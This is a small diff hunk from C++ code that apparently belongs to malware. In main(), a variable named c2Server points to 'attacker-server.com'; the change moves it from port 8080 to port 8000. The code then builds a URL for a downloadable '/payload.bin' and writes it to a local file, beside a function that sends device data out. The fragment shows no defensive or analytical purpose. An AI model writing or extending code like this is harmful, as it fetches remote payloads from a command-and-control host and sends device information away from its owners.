@@ -96,7 +96,7 @@ void sendDeviceData(const std::string& deviceId, const std::string& deviceName, 
 
 int main() {
     // Example usage
-    std::string c2Server = "http://attacker-server.com:8080";
+    std::string c2Server = "http://attacker-server.com:8000";
     std::string payloadUrl = c2Server + "/payload.bin";
     std::string outputFile = "downloaded_payload.bin";
 
